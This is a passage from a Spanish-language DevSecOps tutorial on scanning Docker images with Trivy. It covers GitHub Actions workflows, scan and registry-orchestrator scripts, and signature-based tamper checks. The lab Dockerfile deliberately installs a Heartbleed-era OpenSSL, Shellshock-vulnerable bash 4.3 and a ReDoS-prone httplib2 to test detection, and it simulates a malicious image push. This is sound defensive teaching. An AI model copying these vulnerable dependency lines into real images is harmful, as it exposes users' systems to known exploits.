y forzar el merge (bypass branch protection) pero es obvio que no todos los usuarios del repositorio tendr\u00e1n esos privilegios.</p> <p>Tarea</p> <p>Vamos a recomentar las l\u00edneas que ten\u00edamos comentadas en nuestro Dockerfile para solucionar nuestro fallo de haber incluido unas librer\u00eda vulnerable (no hay que preocuparse, esta imagen por defecto lleva inclu\u00edda la versi\u00f3n de <code>libSSL</code> correcta). Tras ello repetiremos nuestro <code>commit</code> y nuestro <code>push</code>, y comprobaremos que ahora s\u00ed, consigue pasar el <code>status check</code> con un estupendo tick verde.</p> <p>Llegados a este punto s\u00f3lo necesitar\u00edamos la aprobaci\u00f3n de un revisor para hacer nuestro merge. Alquien podr\u00eda preguntarse que si Trivy ha dado su benepl\u00e1cito con un escaneo sin vulnerabilidades, para qu\u00e9 ibamos a necesitar una interacci\u00f3n humana en vez de dejarlo todo completamente automatizado. La repuesta es que aunque Trivy tiene much\u00edsimas posibilidades y el funcinamiento es m\u00e1s que aceptable, es incapaz de detectar todas las vulnerabilidades que podr\u00edan ser introducidas dentro de una imagen Docker. Es por ello que siempre se necesita de un ojo experto y humano que revise el pull request.</p>"},{"location":"segdef/trivy/#explicacion-del-codigo","title":"Explicaci\u00f3n del c\u00f3digo","text":"<p>Veamos el contenido de los archivos m\u00e1s importantes implicados en nuestro workflow de GitHub Actions.</p> <p>Encontramos el archivo que define el workflow propiamente dicho en <code>.github/workflows/scan.yml</code>. El nombre del workflow es indiferente:</p> scan.yml<pre><code>## Descripci\u00f3n general de Github Actions\n## https://docs.github.com/en/actions/learn-github-actions/introduction-to-github-actions#overview\n\n# +--------------------+\n# L\u00d3GICA PRINCIPAL\n# +--------------------+\n\nname: Security - Docker - Scan\n\non: [pull_request] #(1)\njobs:\nscan:\nname: Escanear Docker Im\u00e1genes\nruns-on: ubuntu-20.04 #(2)\nsteps:\n- name: Permitir acceso repositorio #(3)\nuses: actions/checkout@v2\n\n- name: Instalar Trivy #(4)\nrun: |\nbash install.sh\n\n- name: Ejecutar esc\u00e1ner de Trivy #(5)\nrun: |\nbash docker-scan.sh \n</code></pre> <ol> <li>El workflow se disparar\u00e1 cuando se proponga un nuevo cambio via pull request</li> <li>Este workflow se ejecuta en un entorno aislado, en este caso un Ubuntu 20.04</li> <li>Permitimos el acceso a nuestro repositorio</li> <li>Instalamos Trivy en el entorno usando el script de instalaci\u00f3n</li> <li>Finalmente ejecutamos el script que define el escaneo y que veremos a continuaci\u00f3n</li> </ol> <p>El script que define c\u00f3mo realiza el escaneo Trivy: </p> docker-scan.sh<pre><code>#!/bin/bash\n\n# +--------------------+\n# L\u00d3GICA PRINCIPAL\n# +--------------------+\n\nfor docker_build_context_relative_path in docker-builder/registry-repos/*; do #(5)\n[[ ! -d \"$docker_build_context_relative_path\" ]] &amp;&amp; continue #(6)\n\ndocker_build_context_absolute_path=$(realpath \"$docker_build_context_relative_path\") #(7)\n\nlocal_image_name=test-image\n\n    docker build --no-cache --tag \"${local_image_name}\" \"${docker_build_context_absolute_path}\" #(8)\n\ntrivy image --reset #(9)\n\ntrivy image --no-progress --security-checks vuln --severity CRITICAL,HIGH,MEDIUM --exit-code 2 --ignore-unfixed \"${local_image_name}\" #(10)\nvuln_result_code=\"$?\"\n\nif [[ \"$vuln_result_code\" -eq 0 ]]; then #(11)\necho \"La imagen Docker cumple con la pol\u00edtica de seguridad!\"\necho \"Woo hoo!\"\necho \"Empezado el escaneo de la nueva imagen Docker\"\ncontinue\nelif [[ \"$vuln_result_code\" -eq 2 ]]; then\necho \"\u00a1Esta imagen Docker contiene una vulnerabilidad!\"\necho \"\u00a1Soluci\u00f3nala por favor!\"\necho \"PATH: $docker_build_context_absolute_path\"\nexit 1 #(13)\nelse #(14)\necho \"\u00a1Ha habido un error inesperado!\"\necho \"Por favor, contacte con el equipo de seguridad\"\nexit 1\nfi\ndone\n</code></pre> <ol> <li>El script espera esta convenci\u00f3nd de nombres, donde <code>REPO_NAME</code> es el nombre de nuestro repositorio en el Docker Registry (Docker Hub). </li> <li>Esta convenci\u00f3n es para ser compatible con el otro script, docker-registry-orchestrator.sh, que se encarga de subir las im\u00e1genes al registro de Docker.</li> <li>El script se ejecuta cuando se produce un PR</li> <li>Los cambios deben, adicionalmente, ser aprobados por un revisor ya que Trivy funciona muy bien pero no detecta el 100% de las vulnerabilidades.</li> <li>Iteramos sobre los archivos de configuraci\u00f3n de Docker </li> <li>Nos aseguramos de que s\u00f3lo iteramos sobre directorios</li> <li>Obtenemos la ruta absoluta del archivo de configuraci\u00f3n en cuesti\u00f3n </li> <li>Construimos la imagen Docker en local</li> <li>MUY IMPORTANTE porque queremos escanear la imagen reci\u00e9n construida y no obtener resultados de escaneos anteriores de otras im\u00e1genes, por lo que borramos la cach\u00e9 de Trivy</li> <li>Ejecuci\u00f3n del escaneo con Trivy:<ul> <li>Si se encuentra una vulnerabilidad, Trivy emitir\u00e1 el c\u00f3digo de salida <code>2</code></li> </ul> </li> <li>En este bloque, si Trivy emite un c\u00f3digo de salida <code>0</code> signfica que el escaneo ha resultado exitoso y no se ha producio ning\u00fan error inesperado y continua con el escaneo de los siguientes archivos de configuraci\u00f3n</li> <li>Si se produce un c\u00f3digo de salida <code>2</code>, sabemos que esa imagen de Docker contiene una vulnerabilidad.</li> <li>Si salimos con un <code>1</code>, le estamos diciendo a GitHub Actions que el status check es fallido y por tanto bloqueamos el pull request para hacer merge</li> <li>Para el caso de que se produzca un error inesperado no contemplado anteriormente</li> </ol>"},{"location":"segdef/trivy/#demostracion-3","title":"Demostraci\u00f3n 3","text":"<p>En esta demostraci\u00f3n pr\u00e1ctica veremos:</p> <ul> <li>C\u00f3mo usar GitHub actions para subir nuestra im\u00e1genes al registro de Docker</li> <li>Construir/reconstruir im\u00e1genes Docker peri\u00f3dicamente para reducir vulnerabilidades (enfoque proactivo)</li> <li>C\u00f3mo burlar los escaneos de Trivy</li> <li>Manipulaci\u00f3n del registro de Docker</li> <li>Vulnerabilidades que no escaneables</li> </ul> <p>En la secci\u00f3n Manos a la obra se mostraba una imagen donde se ve\u00edan dos puntos de aparici\u00f3n de GitHub Actions; los escaneos de Trivy y el proceso de Build o creaci\u00f3n de la imagen Docker. Como ya hemos visto en profundidad el primero, nos centraremos ahora en el segundo.</p> <p>Surgen un par de preguntas:</p> <ol> <li>\u00bfC\u00f3mo se suben las im\u00e1genes a Docker Hub tras escanearlas con Trivy?</li> <li>\u00bfQu\u00e9 pasa si un atacante compromete nuestro Docker Hub y sube una imagen maliciosa? \u00bfC\u00f3mo podr\u00edamos saberlo?</li> </ol>"},{"location":"segdef/trivy/#explicacion-del-workflow","title":"Explicaci\u00f3n del workflow","text":"<p>Comencemos con un resumen del workflow:</p> builder.yml<pre><code># +--------------------+\n# L\u00d3GICA PRINCIPAL\n# +--------------------+\n\nname: Security - Docker - Registry Orchestrator\non:\n#  schedule: # (3)\n#    - cron: '0 0 * * *'\npush: # (4)\nbranches:\n- main\npaths-ignore: #(5)\n- docker-builder/registry-repos/trivy-tutorial/image_sha.txt\n\njobs:\ndocker-registry-orchestrator:\nname: Docker Registry Orchestrator\nruns-on: ubuntu-20.04\nsteps:\n- name: Checkout current git repo # (6)\nuses: actions/checkout@v2\nwith:\ntoken: ${{ secrets.GIT_AUTOMATION_USER_TOKEN }} # (7)\n\n- name: Instalar Trivy # (8)\nrun: |\nbash install.sh\n\n- name: Log in en Dockerhub # (9)\nuses: docker/login-action@v1\nwith:\nusername: ${{ secrets.DOCKERHUB_USERNAME }}\npassword: ${{ secrets.DOCKERHUB_PASSWORD }}\n\n- name: Interacciones con Docker Registry  # (10) \nrun: |\nbash docker-registry-orchestrator.sh latest ${{ secrets.DOCKERHUB_USERNAME }}\n</code></pre> <ol> <li>Como hemos dicho, este workflow invoca a un script que construye la imagen Docker y la sube al registro de Docker.</li> <li>Tambi\u00e9n invoca a otro script que realiza la validaci\u00f3n de la firma para asegurarse de que las im\u00e1genes del registro no han sido modificadas.   </li> <li> <p>Cuando se reconstruyen las im\u00e1genes, tamb\u00e9n se producen actualizaciones de paquetes. </p> <p>Ejecutando este workflow peri\u00f3dicamente (schedule) minimizamos las vulnerabilidades que pueden aparecer en el escaneo de Trivy.</p> <p>La raz\u00f3n por la que se produce esta actualizaci\u00f3n es porque, si recordamos, en nuestro Dockerfile hab\u00eda una orden de actualizaci\u00f3n de paquetes del sistema operativo (<code>apt-get upgrade</code>).</p> <p>Aparece aqu\u00ed como prueba de concepto, comentado con el fin de ahorrar recursos.</p> </li> <li> <p>El evento push es cuando se acepta un pull request y se hace merge de este c\u00f3digo con la rama main. </p> <p>En este punto el workflow se iniciar\u00e1 y las im\u00e1genes de Docker se subir\u00e1n al registro.</p> </li> <li> <p>Cuando se construye una imagen la firma de la misma se incluye en <code>image_sha.txt</code> y se env\u00eda a la rama <code>main</code> del repositorio.</p> <p>Si permiti\u00e9ramos que este path activara el workflow, habr\u00eda un bucle infinito, as\u00ed que debemos tener en cuenta esa casu\u00edstica y por eso le decimos que se ignore el push en este path.</p> </li> <li> <p>Damos permiso para acceder al repositorio</p> </li> <li> <p>Utilizamos un usuario con permisos de administraci\u00f3n para poder bypassear la protecci\u00f3n de rama y poder hacer un push de la firma a la rama main directamente.</p> </li> <li> <p>Cada vez que se ejecuta el workflow se crea una m\u00e1quina virtual nueva, as\u00ed que tenemos que instalar Trivy siempre.</p> </li> <li> <p>Esto nos permite hacer login en el registro de Docker para subir luego la imagen.</p> </li> <li> <p>Invocamos al script docker-registry-orchestator</p> </li> </ol> <p>Sigamos con el shell script:</p> docker-registry-orchestrator.sh<pre><code>#!/bin/bash\n\n# +--------------------+\n# INPUTS\n# +--------------------+\n\nTAG=\"$1\" # (1)\n\nDOCKERHUB_USER=\"$2\"\n\n# +--------------------+\n# FUNCIONES\n# +--------------------+\n\ngenerate_signature_and_upload_image() {\nlocal local_image_name=\"$1\"\nlocal remote_image_name=\"$2\"\nlocal sig_abs_path=\"$3\"\n\ncontainer-diff analyze --no-cache --format='{{(index .Analysis 0).Digest}}' daemon://\"$local_image_name\" &gt; \"$sig_abs_path\"\n\ndocker tag \"$local_image_name\" \"$remote_image_name\"\ndocker push \"$remote_image_name\"\n}\n\ncommit_and_push_signature() {\nlocal signature_absolute_path=\"$1\"\n\ngit add \"$signature_absolute_path\"\ngit commit -m \"Updating Docker Image signature\"\ngit push origin main\n}\n\n\n# +--------------------+\n# L\u00d3GICA PRINCIPAL\n# +--------------------+\n\ngit config user.name \"Security Bot\" # (2)\ngit config user.email \"&lt;&gt;\"\ngit pull origin main\n\nfor docker_build_context_relative_path in docker-builder/registry-repos/*; do # (3)\n[[ ! -d \"$docker_build_context_relative_path\" ]] &amp;&amp; continue\n\ndocker_build_context_absolute_path=$(realpath \"$docker_build_context_relative_path\")\n\nrepo_name=$(basename \"$docker_build_context_absolute_path\")\n\nlocal_image_name=\"$repo_name:$TAG\" # (4)\n\nremote_image_name=\"$DOCKERHUB_USER/$local_image_name\" # (5)\n\ndocker build --no-cache --tag \"${local_image_name}\" \"${docker_build_context_absolute_path}\" # (6)\n\n# +--------------------------------------------------------------+\n# L\u00d3GICA PARA COMPROBAR LAS MODIFICACIONES MALICIOSAS (TAMPERING)\n# +--------------------------------------------------------------+\n\nsignature_absolute_path=\"$docker_build_context_absolute_path/image_sha.txt\"\nfirst_run=false\nif [[ ! -f \"$signature_absolute_path\" ]]; then # (7)\nfirst_run=true\nfi\n\nif [[ \"$first_run\" == \"true\" ]]; then # (8)\n\ngenerate_signature_and_upload_image \"$local_image_name\" \"$remote_image_name\" \"$signature_absolute_path\"\n\ncommit_and_push_signature \"$signature_absolute_path\"\n\necho \"Primera vez que se construye esta imagen...\"\necho \"Salt\u00e1ndonos las comprobaciones de integridad...\"    continue\nfi\n\ndocker pull \"${remote_image_name}\"\n\nremote_signature=$(container-diff analyze --no-cache --format='{{(index .Analysis 0).Digest}}' daemon://\"$remote_image_name\") # (9)\nprevious_build_signature=$(cat \"$signature_absolute_path\") # (10)\n\nif [[ \"${remote_signature}\" != \"${previous_build_signature}\" ]]; then # (11)\necho \"La firma remote NO coincidie con la de la \u00faltima imagen que se construy\u00f3\"\necho \"\u00a1Puede que se haya producido una modificaci\u00f3n maliciosa en Docker Hub!\"\n\necho \"Firma remota: $remote_signature\"\necho \"Firma del \u00faltimo build: $previous_build_signature\"\necho \"Docker Registry Repo: $repo_name\"\n\necho \"Corriendo el esc\u00e1ner de Trivy sobre la imagen Docker remota\" # (12)\n\ntrivy image --reset\n\n        trivy image --no-progress --severity CRITICAL,HIGH,MEDIUM --ignore-unfixed \"${remote_image_name}\"\n\necho \"Buscando diferencias entre las im\u00e1genes de Docker\" # (13)\ncontainer-diff diff \\\n--no-cache \\\n--order \\\n--type apt \\\n--type file \\\n--type history \\\n--type layer \\\n--type metadata \\\n--type pip \\\n--type size \\\n--type sizelayer \\\ndaemon://$local_image_name\\\ndaemon://$remote_image_name\n\necho \"\u00a1No subimos la imagen!\" # (14)\necho \"Debe llevarse a cabo una investigaci\u00f3n\"\n\nexit 1\nelse # (15)     \necho \"\u00a1No se ha producido tampering de la imagen Docker!\"\ngenerate_signature_and_upload_image \"$local_image_name\" \"$remote_image_name\" \"$signature_absolute_path\"\ncommit_and_push_signature \"$signature_absolute_path\"\nfi\ndone\n</code></pre> <ol> <li> <p>Los tags son una forma de versionar im\u00e1genes en Docker. En esta demo utilizaremos el tag <code>latest</code>.</p> </li> <li> <p>Configuraciones b\u00e1sicas de Git</p> </li> <li> <p>Iteramos sobre los archivos de configuraci\u00f3n</p> </li> <li> <p>Empezamos a generar el nombre de la imagen</p> </li> <li> <p>Nos bajamos la iamgen del repositorio remoto</p> </li> <li> <p>Construimos la imagen</p> </li> <li> <p>Si es la primera vez que se construye la imagen, no se comprobar\u00e1 la firma puesto que no hay ninguna generada con anterioridad.</p> </li> <li> <p>Asumiento que es la primera vez que generamos la imagen, utilizamos una herramienta de Google llamada container-diff para generar su primera firma. </p> <p>En las ejecuciones subsiguientes comprobaremos que la firma de la imagen coincide con la del repositorio.</p> </li> <li> <p>Obtenemos la firma de la imagen remota</p> </li> <li> <p>Obtenemos la firma de la \u00faltima imagen que se construy\u00f3</p> </li> <li> <p>Si la firma actual y la anterior no coinciden es posible que se haya producido una modificaci\u00f3n malintencionada en nuestro repositorio Docker. </p> </li> <li> <p>Hacemos un an\u00e1lisis que pueda ayudar en una investigaci\u00f3n posterior.</p> </li> <li> <p>Hacemos uso de <code>container-diff</code> para ver las diferencias entre im\u00e1genes. </p> </li> <li> <p>Tras todo esto, no vamos a subir la imagen al registro de Docker sino que se necesita comenzar una investigaci\u00f3n forense y/o enviar una alerta a un SIEM..</p> </li> <li> <p>Si se ejecuta esta parte del c\u00f3digo es que no se ha detectado ninguna modificaci\u00f3n y se subir\u00e1 la iamgen, as\u00ed como la firma de la misma.</p> </li> </ol>"},{"location":"segdef/trivy/#simulando-una-manipulacion-maliciosa-de-la-imagen-en-docker-hub","title":"Simulando una manipulaci\u00f3n maliciosa de la imagen en Docker Hub","text":"<p>Tarea</p> <p>Si volv\u00e9is al site de GitHub que nos permit\u00eda forzar el merge del pull request que ten\u00edamos pendiente gracias a nuestros permisos de administrador, hacedlo.</p> <p>Os aparecer\u00e1 este segundo workflow que hemos visto ejecut\u00e1ndose (con el punto amarillo).</p> <p>Tras hacer el merge y completarse el workflow, deb\u00e9is ver en la pesta\u00f1a Code un anuncio de que Security Bot actualizado la firma.</p> <p></p> <p>Y si hac\u00e9is clic, podr\u00e9is ver el nuevo valor de la firma.</p> <p>Visto que todo funciona correctamente, hagamos nuestra simulaci\u00f3n introduciendo una imagen vulnerable de Docker en nuestro repositorio. Para ello vamos a descomentar las l\u00edneas resaltadas de nuestro Dockerfile:</p> Dockerfile<pre><code>FROM debian\n\nENV DEBIAN_FRONTEND noninteractive\n\n# +---------------------------------------------------------+\n# INSTALACI\u00d3N A NIVEL DE SISTEMA MEDIANTE GESTOR DE PAQUETES\n# +---------------------------------------------------------+\n\nRUN apt-get update -y &amp;&amp;\\\napt-get dist-upgrade -y &amp;&amp;\\\napt-get install -y apache2 \\\nwget \\\npython3-pip\\\n#   libncursesw5-dev libssl-dev \\\n#   libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev libffi-dev zlib1g-dev \\\nbuild-essential &amp;&amp;\\\napt-get autoremove &amp;&amp;\\\napt-get clean &amp;&amp;\\\nrm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*\n\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/libssl1.0.0_1.0.1e-2_amd64.deb -O /tmp/libssl1.0.0_1.0.1e-2_amd64.deb &amp;&amp; \\\n#    dpkg -i /tmp/libssl1.0.0_1.0.1e-2_amd64.deb\n\n#RUN wget http://snapshot.debian.org/archive/debian/20130319T033933Z/pool/main/o/openssl/openssl_1.0.1e-2_amd64.deb -O /tmp/openssl_1.0.1e-2_amd64.deb &amp;&amp;\\\n#    dpkg -i /tmp/openssl_1.0.1e-2_amd64.deb\n\n# +--------------------+\n# MAKE INSTALLATION (shellshock)\n# (system-level installation WITHOUT package manager)\n# +--------------------+\n\n#RUN wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz &amp;&amp; \\ # (1)\n#    tar zxvf bash-4.3.tar.gz &amp;&amp; \\\n#    cd bash-4.3 &amp;&amp; \\\n#    ./configure &amp;&amp; \\\n#    make &amp;&amp; \\\n#    make install\n# +------------------------------------------------------------------------+\n# INSTALACI\u00d3N A NIVEL DE APLICACI\u00d3N MEDIANTE GESTOR DE PAQUETES (regex DoS)\n# +------------------------------------------------------------------------+\n#COPY lang_dependencies/Pipfile.lock /app/Pipfile.lock \n\n#RUN pip3 install httplib2==0.18.1 --break-system-packages # (2)\n</code></pre> <ol> <li>Esta versi\u00f3n de Bash es vulnerable a Shellshock. \u00c9sta es una vulnerabilidad cr\u00edtica de Bash que permitir\u00eda la ejecuci\u00f3n arbitraria de comandos y que ya hemos visto con anterioridad.</li> <li>Con esto introducimos una vulnerabilidad DoS mediante una expresi\u00f3n regular (ReDoS) en un paquete de Python (httplib2)</li> </ol> <p>Por poner en contexto: puede parecer que estas vulnerabilidades tampoco son para tanto pero imaginemos que lo que se introduce es un minado de criptos. Las cientos o miles de personas que utilizasen esa imagen Docker ser\u00edan potenciales v\u00edctimas de un lucrativo negocio.</p> <p>Pasamos a construir la imagen nosotros mismos:</p> <pre><code>$ docker build -t usuario-docker/trivy-tutorial docker-builder/registry-repos/trivy-tutorial\n</code></pre> <p>As\u00ed evitamos pasar por Git y ser detectados por los workflows anteriores.</p> <p>En este caso estamos suponiendo que un atacante ha conseguido nuestras credenciales del Docker Hub por cualquiera de las m\u00faltiples maneras posibles. Teniendo en cuenta esto, nos logueamos en Docker Hub:</p> <pre><code>$ docker login --username nombre-usuario-docker\n</code></pre> <p>Y subimos la nueva imagen:</p> <pre><code>$ docker push nombre-usuario-docker/trivy-tutorial\n</code></pre> <p>Pues ya tendr\u00edamos simulado un ataque con una imagen modificada. Teniendo en cuenta que con anterioridad hab\u00edamos comentado el bloque del workflow que nos permit\u00eda ejecutarlo peri\u00f3dicamente (schedule) y para cumplir los prop\u00f3sitos de esta demo, vamos a ejecutar de nuevo los jobs manualmente, para ver si se detecta la problem\u00e1tica.</p> <p>En la pesta\u00f1a Actions, en el workflow <code>Docker Registry Orchestator</code> que es el que nos interesa, le damos a re-ejecutar los jobs:</p> <p></p> <p>Si todo ha ido correctamente, el workflow fallar\u00e1. Y si mir\u00e1is los detalles, deb\u00e9is ver que Trivy ha detectado una vulnerabilidad en <code>Pipfile.lock</code> pero no ha detectado Shellshock.</p> <p>Pregunta</p> <p>Shellshock no se ha detectado por una raz\u00f3n concreta y es una de las causas del tipo de vulnerabilidades que no detecta Trivy y se necesita la aprobaci\u00f3n humana que coment\u00e1bamos antes. \u00bfSabr\u00edas decir cu\u00e1l es esta raz\u00f3n?</p>"},{"location":"segdef/trivy/#conclusion","title":"Conclusi\u00f3n","text":"<p>Ninguna herramienta de ciberseguridad puede monitorizar TODOS los ataques. Sin embargo, una combinaci\u00f3n de herramientas adecuadas pueden ofrecer pintas sobre qu\u00e9 ha cambiado</p> <p>Pregunta</p> <p>\u00bfSer\u00edas capaz de en la salida que nos ofrece la pesta\u00f1a Actions identificar la salida de <code>container-diff</code> y donde se ven todos los archivos relativos a bash que se han a\u00f1adido a la imagen?</p>"},{"location":"segdef/trivy_test/","title":"Trivy test","text":"<p>feedback link: Un enlace en el que los usuarios puedan darte feedback (quiz\u00e1s creando un issue en un repositorio de git) analytics account: ID de Google Analytics</p> <p>title: An\u00e1lisis de vulnerabilidades en contenedores con Trivy</p>"},{"location":"segdef/trivy_test/#description","title":"description:","text":""},{"location":"segdef/trivy_test/#introduccion","title":"Introducci\u00f3n","text":"<p>A medida que las aplicaciones cada vez m\u00e1s van cambiando su infraestructura a una basada en contenedores, m\u00e1s se va haciendo evidente que hay que auditar estos contenedores en b\u00fasqueda de vulnerabilidades.</p> <p>En esta secci\u00f3n usaremos Trivy para auditar im\u00e1genes de contenedores y, adem\u00e1s, veremos como integrar Trivy con Github Actions para que se produzca un escaneo autom\u00e1tico de la imagen cada vez que esta se construya. Adem\u00e1s, gracias a ello, veremos c\u00f3mo prevenir que im\u00e1genes vulnerables pasen a producci\u00f3n.</p>"},{"location":"segdef/trivy_test/#que-es-trivy","title":"\u00bfQu\u00e9 es Trivy?","text":"<p>Trivi es un sencillo, r\u00e1pido y completo esc\u00e1ner de vulnerabilidades para contenedores, muy adecuado para la integraci\u00f3n continua y DevSecOps. Esta herramienta detecta vulnerabilidades en los paquetes de los sistemas operativos, sea \u00e9ste Alpine, RHEL, Debian, Ubuntu, Amazon Linux o lo que proceda, adem\u00e1s de en ependencias de aplicaciones (Node, Ruby, Python, Java...).</p> <p>Debido a la rapidez de Trivy, podemos integrarlo f\u00e1cilmente de forma directa en nuestros workflows de desarrollo. Dicho de otro modo, en cu\u00e1nto un desarrollador actualice el c\u00f3digo, \u00e9ste puede ser escaneado en tiempo real en b\u00fasqueda de vulnerabilidades.</p> <p></p>"},{"location":"segdef/trivy_test/#nist-csf-y-trivy","title":"NIST CSF y Trivy","text":"<p>Este framework consta de tres componentes principales, el Core, los niveles de implementaci\u00f3n (Tiers) y los Perfiles. El core, que es lo que se muestra en la siguiente imagen, contiene las mejores pr\u00e1cticas a alto nivel para ciberseguridad y manejo del riesgo, en general.</p> <p></p> <p>Trivy se centra en las funciones de identificaci\u00f3n y protecci\u00f3n, principalmente. Adem\u00e1s, este framework define categor\u00edas para cada funci\u00f3n y Trivy de nuevo se centra en dos de ellas, manejo del riesgo y procesos y proedimientos para la protecci\u00f3n de la informaci\u00f3n.</p> <p>As\u00ed las cosas, Trivy nos ayudar\u00e1 a identificar y documentar las vulnerabilidades de nuestros activos (contenedores) y, mediante su integraci\u00f3n con Github Actions, podremos controlar los controles de cambios:</p> <p></p>"},{"location":"segdef/trivy_test/#demostracion-1","title":"Demostraci\u00f3n 1","text":"<p>Info</p> <p>Esta demostraci\u00f3n ha sido realizada con Debian 11 Bullseye y se ha comprobado que funciona correctamente.</p> <p>Para esta demostraci\u00f3n el primer paso es, como cab\u00eda esperar, instalar Trivy. Para ello:</p> <ol> <li> <p>Deb\u00e9is clonaros en vuestra m\u00e1quina virtual el repositorio: <code>https://github.com/trivy-org/analisis-trivy</code></p> </li> <li> <p>Si echamos un ojo al script <code>install.sh</code> vemos que:</p> <ol> <li>Obtiene el nombre de la distribuci\u00f3n</li> <li>Instala Trivy y las dependencias necearias</li> <li>Tambi\u00e9n instala <code>container-diff</code> para inspeccionar y detectar im\u00e1genes que hayan sido manipuladas </li> <li>Se instala Docker en caso de que sea necesario porque no est\u00e9 instalado ya</li> </ol> </li> <li>Ejecutamos el script de instalaci\u00f3n y comprobamos que Trivy se ha instalado correctamente</li> </ol> <p>Comencemos pues con la demo propiamente dicha. Podemos ver que Trivy tiene multitud de opciones, como escaneo de im\u00e1genes, de sistema de archivos local, repositorio remoto...:</p> <p><pre><code>$ trivy --help\n</code></pre> No obstante, en nuestro caso nos centraremos \u00fanicamente en el escaneo de im\u00e1genes Docker. Escaneemos una imagen de Docker Hub a modo de ejemplo:</p> <pre><code>$ trivy image zachroofsec/trivy-tutorial1\n</code></pre> <ul> <li> <p>En primer lugar vemos que Tivy se queja de que estamos usando el tag <code>latest</code>. Para nuestros prop\u00f3sitos no hay problema alguno puesto que no estamos cambiando nada de las capas subyacentes de la imagen, m\u00e1s adelante ya nos preocuparemos de esto.</p> </li> <li> <p>Vemos que Trivy nos informa de m\u00e1s de mil vulnerabilidades en el momento en que se escriben estos apuntes. De locos. Inabarcable.</p> <p></p> </li> </ul> <p>Tarea</p> <p>Explorar en la ayuda de Trivy los flags que se pueden usar en la l\u00ednea de comandos para escanear im\u00e1genes:</p> <p><pre><code>$ trivy image --help\n</code></pre> Y realizar un escaneo m\u00e1s sensato y priorizando vulnerabilidades. Esto incluye que se reporten \u00fanicamente las vulnerabilidades CRITICAL y HIGH, as\u00ed como que se ignoren aquellas que no tengan una soluci\u00f3n conocida. Comprueba c\u00f3mo se reduce dr\u00e1sticamente el n\u00famero de vulnerabilidades mostradas.</p> <p>Info</p> <p>La severidad que muestra Trivy para las vulnerabilidades puede venir de distintos sitios. Se puede obetner de la NVD (National Vulnerability Database) o directamente del vendor o fabricate.  Por ejemplo, para un paquete de Ubuntu, Trivy aprovehcar\u00e1 el reporte de vulnerabilidades que haya publicado la propia Canonical y favorecer\u00e1 esta severidad respecto a la de la NVD.</p> <p>Vemos que la mayor\u00eda de los CRITICAL y HIGH se los llevan algunas librer\u00edas de OpenSSL, incluyendo el famoso Heartbleed que permite que un usuario malicioso no autenticado pueda, en ciertos casos, leer la memoria de la m\u00e1quina.</p> <p>En definitiva y para terminar, podemos decir que hemos utilizado Trivy para llevar a cabo una estrategia reactiva puesto que mediante ella detectamos las vulnerabilidades a posteriori, teniendo que solucionarlas una vez est\u00e1n ya en producci\u00f3n. Veremos en la pr\u00f3xima demostroaci\u00f3n como podemos adoptar una estrategia m\u00e1s preventiva con el fin de evitar que estos problemas lleguen ni siquiera a publicarse.</p>"},{"location":"segdef/trivy_test/#demostracion-2","title":"Demostraci\u00f3n 2","text":""},{"location":"segdef/trivy_test/#que-es-github-actions","title":"\u00bfQu\u00e9 es Github actions?","text":"<p>GitHub Actions es una plataforma de integraci\u00f3n y despliegue continuos (CI/CD) que te permite automatizar tu mapa de compilaci\u00f3n, pruebas y despliegue. Puedes crear flujos de trabajo (workflows) y crear y probar cada solicitud de cambios en tu repositorio o desplegar solicitudes de cambios fusionadas a producci\u00f3n.</p> <p>GitHub Actions va m\u00e1s all\u00e1 de solo DevOps y te permite ejecutar flujos de trabajo cuando otros eventos suceden en tu repositorio. Por ejemplo, puedes ejecutar un flujo de trabajo para que agregue autom\u00e1ticamente las etiquetas adecuadas cada que alguien cree una propuesta nueva en tu repositorio.</p> <p>GitHub proporciona m\u00e1quinas virtuales Linux, Windows y macOS para que ejecutes tus flujos de trabajo o puedes hospedar tus propios ejecutores auto-hospedados en tu propio centro de datos o infraestructura en la nube.</p> <p>Un workflow ejecutar\u00e1 uno o m\u00e1s jobs y se definen mediante un archivo YAML. Estos archivos se ubican en el directorio <code>.github/workflows</code> de un repositorio y puede haber varios archivos de workflow para diferentes cometidos.</p> <p>Un evento es una actividad que dispara un flujo de trabajo o workflow. Estos eventos pueden ser un push, un pull request o un merge.</p> <p>Por \u00faltimo, los jobs son acciones o pasos que se ejecutan dentro de un workflow.</p> <p>Una acci\u00f3n es una aplicaci\u00f3n personalizada para la plataforma de GitHub Actions que realiza una tarea compleja pero que se repite frecuentemente</p> <p>Para entender detalladamente todos los componentes, pod\u00e9is consultar aqu\u00ed.</p>"},{"location":"segdef/trivy_test/#manos-a-la-obra","title":"Manos a la obra","text":"<p>En esta ocasi\u00f3n vamos a utilizar un enfoque proactivo para la integraci\u00f3n de Trivy en el proceso de revisi\u00f3n de c\u00f3digo mediante el uso de GitHub Actions.</p> <p>B\u00e1sicamente, lo que vamos a hacer con GitHub Actions es crear un Ubuntu Server que estar\u00e1 hospedado en la infraestructura de GitHub y podremos usarlo para auditar los cambios antes de subir la imagen al Docker Registry. Es m\u00e1s, podemos examinar el resultado del escaneo de Trivy e incluirlo en un Pull Request, permitiendo que se produzca una discusi\u00f3n antes de incorporar los cambios.</p> <p> </p> <p>En primer lugar, deb\u00e9is hacer un fork en vuestra cuenta del repositorio</p> <p><code>https://</code></p> <p>Y tras ello, en el terminal, os deb\u00e9is clonar el repositorio que utilizaremos como referencia:</p> <pre><code>$ git clone </code></pre> <p>Y como medida de seguridad, protegeremos la \u00fanica rama que tenemos ahora mismo (main). Para ello bien hac\u00e9is click en el propio aviso que os aparece en el repositorio al entrar v\u00eda web:</p> <p></p> <p>O bien v\u00e1is directamente a <code>Settings</code>:</p> <p></p> <p>Y marc\u00e1is lo que aparece en la imagen, que b\u00e1sicamente viene a decir que antes de hacer un merge, se requiere un pull request y adem\u00e1s, aprobaci\u00f3n del mismo. Tambi\u00e9n se requiere que pase los status check (nuestras acciones de Github Actions) antes de poder hacer un merge</p> <p>Supongamos ahora que somos un desarrollador con el prop\u00f3sito de realizar o proponer cambios en nuestro Dockerfile. En primer lugar, nos crearemos la rama updates para realizar los cambios con los que luego haremos el merge a la rama principal:</p> <pre><code>$ git checkout -b updates\n</code></pre> <p>Ahora, dentro de nuestro Dockerfile, realizaremos algunos cambios. En primer lugar, a\u00f1adiremos algunos <code>apt-get installs</code>, como por ejemplo Apache, wget y build-essential. Tambi\u00e9n instalaremos una versi\u00f3n de libSSL. As\u00ed pues, editamos 